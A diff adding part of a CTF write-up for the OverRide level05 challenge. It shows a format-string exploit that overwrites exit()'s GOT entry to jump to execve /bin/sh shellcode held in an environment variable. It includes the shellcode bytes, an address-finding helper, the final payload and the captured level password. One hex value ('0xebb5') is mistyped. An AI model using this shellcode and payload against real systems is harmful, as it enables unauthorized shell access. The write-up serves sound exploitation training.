@@ -71,3 +71,62 @@ Non-debugging symbols:
 ```
 
 In above, the call for `exit()` is used, and we can overrite the exit() in the GOT(Global Offset Table) section.
+
+To find the GOT address of exit, the following command needs to be proceed:
+
+```
+level05@OverRide:~$ objdump -R level05 | grep exit
+080497e0 R_386_JUMP_SLOT   exit
+level05@OverRide:~$
+```
+
+We now have an address for exit, `0x080497e0`, we need to provide a payload that overwrites a shellcode.
+
+```
+# a shellcode
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
+
+# store create payload that stores shellcode
+
+export PAYLOAD=$(python -c "print '\x90' * 1000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
+
+```
+
+With the shellcode stored into the environment variable, a program can be writeen to access the address of the shellcode
+
+```
+# /tmp/getenv.c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char *argv[])
+{
+	printf("env address: %p\n", getenv(argv[1]));
+	return (0);
+}
+[...]
+level05@OverRide:/tmp$ gcc -m32 getenv.c -o getenv  # for 32bit
+level05@OverRide:/tmp$ ./getenv PAYLOAD
+env address: 0x7fffffffebbd
+
+### remember, the env. variable will change of the execution point, so let's run the program on different location ###
+level05@OverRide:~$ /tmp/getenv PAYLOAD
+0xffffdefd
+```
+
+We now have address we want(=`exit`) to overwrite: `0x080497e0`, with the address of the stack `0xffffdefd`
+
+Because the address too big, we overwrite the target 2 bytes each time. (the first 4 bytes of address can be ignored)
+
+for the first 2 bytes, we input the data `0xdefd - 0x8 = 0xebb5(57077)` (because what the payload will prit out is 8 bytes=> XXXX that creates the offset of the printf already, and each address is 4 bytes XXXXXXX), then we overwrite the next two bytes `0xffff - 0xdefd = 0x2102 (8450)`
+
+let's try out
+
+```
+level05@OverRide:~$ echo $(python -c 'from struct import pack; print(pack("I", 0x080497e0) + pack("I", 0x080497e2) + "%57077u%10$hn" + "%8450u%11$hn")') | ./level05
+[...]
+[...]
+[...]
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+level05@OverRide:~$
+```
